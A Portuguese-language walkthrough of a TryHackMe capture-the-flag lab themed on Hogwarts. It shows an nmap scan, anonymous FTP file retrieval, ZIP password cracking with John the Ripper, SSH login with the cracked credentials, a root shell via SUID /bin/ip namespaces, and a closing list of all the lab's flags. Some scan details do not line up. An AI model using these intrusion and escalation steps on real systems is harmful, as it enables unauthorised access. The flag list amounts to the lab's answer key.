# ⚡ CTF Hogwarts - Writeup Completo (TryHackMe)

**Data:** 18 de Abril de 2026  
**Alvo:** `10.10.212.163` 

---

## 1. Reconhecimento de Rede (Nmap)

O objetivo inicial foi mapear a superfície de ataque e identificar serviços em portas não convencionais.

**Comando:**
```bash
nmap -sV -sC -Pn -T4 -p- 10.10.212.163
```

**Resultado:**
```text
PORT      STATE SERVICE VERSION
22/tcp    open  http    Apache httpd 2.4.38 ((Debian))
9440/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
9736/tcp  open  http    PHP cli server 5.5 or later
|_http-title: Hogwart's Royal Entry
10255/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
43768/tcp open  unknown
| last sighted in hogwa
```

**Raciocínio:**  
O scan revelou serviços críticos em portas altas. O FTP (10255) permitia login anônimo e a porta 9736 rodava um servidor PHP, indicando vetores de entrada via exfiltração e web.

---
## 2. Exploração de FTP e Exfiltração

Acesso ao FTP anônimo na porta **10255**, listagem de diretórios ocultos (`...`) e download dos arquivos encontrados.

**Sessão FTP (listagem e downloads):**
```text
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 ...
-rw-r--r--    1 ftp      ftp           105 Sep 06  2020 GoAway.exe
226 Directory send OK.
ftp> get GoAway.exe
local: GoAway.exe remote: GoAway.exe
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for GoAway.exe (105 bytes).
226 Transfer complete.
105 bytes received in 0.00 secs (163.5392 kB/s)
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
-rw-r--r--    1 ftp      ftp           231 Apr 27 09:04 .I_saved_it_harry.zip
-rw-r--r--    1 ftp      ftp           157 Sep 06  2020 note4neville
226 Directory send OK.
ftp> get note4neville
local: note4neville remote: note4neville
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note4neville (157 bytes).
226 Transfer complete.
157 bytes received in 0.00 secs (358.2250 kB/s)
ftp> get .I_saved_it_harry.zip
local: .I_saved_it_harry.zip remote: .I_saved_it_harry.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .I_saved_it_harry.zip (231 bytes).
226 Transfer complete.
231 bytes received in 0.00 secs (4.5896 MB/s)
ftp> exit
221 Goodbye.
```

**Leitura dos arquivos baixados (fora do FTP):**
```bash
cat note4neville
cat .IamHidden
cat GoAway.exe
```

**Saída:**
```text
root@ip-10-10-153-170:~# cat note4neville 
Hagrid: Oi Neville even I ws able to open your secret file!  Yeah now change it before someone gets in. These are troubled times, I tell ya 'roubled imes.!!

root@ip-10-10-153-170:~# cat .IamHidden 
Hagrid: You just don't understand do you? shoooooooo Go away! this is prolly a ded end!.. huh 

root@ip-10-10-153-170:~# cat GoAway.exe 
Hagrid: Oh no harry, y'are steell poking injections around 'ere aren't ya? Go away 'arry, me tellin' ya.
```

**Raciocínio:**  
- O diretório `...` indicou conteúdo escondido no FTP.  
- `GoAway.exe` trouxe a dica explícita de **injections** → forte indicação de **SQL Injection** na aplicação web.  
- `note4neville` apontou que o Neville tinha um “secret file” (pista de credenciais).

---

## 3. Quebra de senha do ZIP 

Tentativa de extração do ZIP revelou que ele estava protegido por senha.

**Comando:**
```bash
unzip .I_saved_it_harry.zip
```

**Saída:**
```text
Archive:  .I_saved_it_harry.zip
[.I_saved_it_harry.zip] boot/.pass password:
```

Foi usado o **John the Ripper** com `zip2john`.

**Comandos:**
```bash
zip2john .I_saved_it_harry.zip > zip.hash
cat zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Saídas:**
```text
root@ip-10-10-153-170:~# zip2john .I_saved_it_harry.zip > zip.hash
ver 1.0 efh 5455 efh 7875 .I_saved_it_harry.zip/boot/.pass PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=6229389F type=0

root@ip-10-10-153-170:~# cat zip.hash 
.I_saved_it_harry.zip/boot/.pass:$pkzip2$1*2*2*0*2d*21*6229389f*0*44*0*2d*6229*4892*39a9ffdbda932ed28b970953a34b306fbbed3b8c358c79e374b5dc9a6f1c742022423ea88e6ee43793f962bef9*$/pkzip2$:boot/.pass:.I_saved_it_harry.zip::.I_saved_it_harry.zip

root@ip-10-10-153-170:~# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
anime            (.I_saved_it_harry.zip/boot/.pass)
1g 0:00:00:00 DONE (2026-04-27 10:13) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Extração do ZIP com a senha obtida e leitura do arquivo `.pass`:**
```bash
unzip .I_saved_it_harry.zip
cat boot/.pass
```

**Saída:**
```text
root@ip-10-10-153-170:~# unzip .I_saved_it_harry.zip 
Archive:  .I_saved_it_harry.zip
[.I_saved_it_harry.zip] boot/.pass password: 
 extracting: boot/.pass              

root@ip-10-10-153-170:~# cat boot/.pass 
neville:ocxxbwaznnkzkymq6m7tmdykv
```

**Raciocínio:**  
A senha do ZIP era `anime`, e o arquivo `boot/.pass` revelou credenciais no formato `user:pass`, permitindo login como **neville** via SSH.

---

## 4. Enumeração SSH

**Comando:**
```bash
ssh neville@10.10.212.163 -p 9440
```

**Saída (trecho):**
```text
The authenticity of host '[10.10.212.163]:9440 ([10.10.212.163]:9440)' can't be established.
...
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1112-aws x86_64)
```

---

## 5. Enumeração de SUID (com saída)

**Comando:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Saída:**
```text
/etc/room_of_requirement
/bin/mount
/bin/fusermount
/bin/ping
/bin/ping6
/bin/ip
/bin/umount
/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9804/bin/mount
/snap/core/9804/bin/ping
/snap/core/9804/bin/ping6
/snap/core/9804/bin/su
/snap/core/9804/bin/umount
/snap/core/9804/usr/bin/chfn
/snap/core/9804/usr/bin/chsh
/snap/core/9804/usr/bin/gpasswd
/snap/core/9804/usr/bin/newgrp
/snap/core/9804/usr/bin/passwd
/snap/core/9804/usr/bin/sudo
/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9804/usr/lib/openssh/ssh-keysign
/snap/core/9804/usr/lib/snapd/snap-confine
/snap/core/9804/usr/sbin/pppd
```

**Raciocínio:**  
O destaque aqui é o `/bin/ip` com SUID, que frequentemente permite abusos com **network namespaces** para obter shell privilegiada.

---

## 6. Privilégio Root via `/bin/ip` 

**Comandos:**
```bash
ip netns add foo
ip netns exec foo /bin/sh -p
```

**Saída:**
```text
neville@ip-10-10-212-163:~$ ip netns add foo
neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
# whoami
root
```

---

## 7. Binário SUID custom `/etc/room_of_requirement` (extração de pista)

**Comando:**
```bash
ls -la /etc/room_of_requirement
```

**Saída:**
```text
---Sr-sr-x 1 root root 17126 Apr 27 09:04 /etc/room_of_requirement
```

**Comando:**
```bash
cat /etc/room_of_requirement
```

**Saída (trecho relevante encontrado no meio do binário):**
```text
Invisibilty cloak: m5ktp!h970#ej0@8ja4hj8l00
```

---

## 8. Busca final de flags (com saída)

**Comando:**
```bash
grep -rE "THM\{|flag\{" /var /etc /opt /home /root /srv 2>/dev/null
```

**Saída:**
```text
/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{its_wingardium_laviosaa_Ron}
/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Yeah_1_swallowed_the_sn1tch.}
/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{I_unarm3d_dumbled0re}
/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
/var/www/mymainsite/conn.php:        $FLAG = "THM{wait-for-your-letter!}";
/etc/left_corridor/seventh_floor/.entrance:THM{That-boy-was-Tom-Riddle}
/home/hermoine/special_spell.txt:THM{its_wingardium_laviosaa_Ron}
/home/draco/achievements.txt:THM{I_unarm3d_dumbled0re}
/home/harry/special_spell.txt:THM{Yeah_1_swallowed_the_sn1tch.}
/root/headmaster.txt:THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
```

**Resumo das flags extraídas:**
- **Hermione:** `THM{its_wingardium_laviosaa_Ron}`
- **Harry:** `THM{Yeah_1_swallowed_the_sn1tch.}`
- **Draco:** `THM{I_unarm3d_dumbled0re}`
- **Web Config:** `THM{wait-for-your-letter!}`
- **Hidden Room:** `THM{That-boy-was-Tom-Riddle}`
- **Root:** `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}`
- **Root Flag:** `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}`

